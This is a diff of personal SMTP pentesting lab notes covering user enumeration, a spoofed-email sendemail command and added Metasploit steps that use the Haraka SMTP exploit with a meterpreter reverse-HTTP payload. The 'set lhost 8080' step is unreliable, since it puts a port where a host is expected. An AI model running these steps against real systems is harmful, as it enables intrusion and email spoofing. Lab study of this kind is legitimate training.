@@ -1,3 +1,15 @@
+# Table of Contents
+1. Overview
+	1. ports
+2. Tools
+	1. netcat
+	2. telnet
+	3. [smtp-user-enum](#smtp-user-enum)
+	4. [sendmail](#sendmail)
+	5. [msfconsole](#msfconsole)
+
+---
+
 # Overview
 Simple Mail Transfer Protocol
 
@@ -51,3 +63,14 @@ smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
 ```bash
 sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
 ```
+
+## msfconsole
+### Example
+1. `db_nmap -sV -O demo.ine.local` : scan and import
+2. `search type:exploit name:haraka` : search for service found
+3. `use exploit/linux/smtp/haraka`
+	1. `options` : view options to set
+	2. `set SRVPORT 9898` : local listen port
+	3. `set email_to root@attackdefense.test`
+	4. `set payload linux/x64/meterpreter_reverse_http`
+	5. `set lhost 8080` : set payload lhost
